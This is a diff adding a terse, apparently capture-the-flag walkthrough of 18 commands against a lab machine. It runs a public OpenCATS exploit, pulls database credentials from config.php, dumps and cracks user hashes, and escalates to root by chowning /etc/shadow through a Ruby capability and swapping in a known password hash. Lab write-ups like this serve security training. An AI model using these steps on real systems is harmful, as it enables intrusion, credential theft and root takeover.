@@ -1,0 +1,18 @@
+1 - nmap -A 10.10.3.96
+2 - view-source:http://10.10.3.96
+3 - echo "10.10.3.96 job.empline.thm" | tee -a /etc/hosts
+4 - http://job.empline.thm
+5 - searchsploit "opencats 0.9.4"
+6 - searchsploit -m 50585.sh
+7 - sh 50585.sh http://job.empline.thm
+8 - cat /var/www/opencats/config.php
+9 - mysql -u james -h 10.10.3.96 -p
+10 - show databases; use opencats; show tables; select * from user;
+11 - crackstation
+12 - ssh george@10.10.3.96
+13 - cat user.txt
+14 - getcap / -r 2>/dev/null
+15 - ruby -e 'File.chown(1002,1002,"/etc/shadow")'
+16 - nano /etc/shadow -> Replace root passhash <-> george passhash
+17 - su root
+18 - cat /root/root.txt
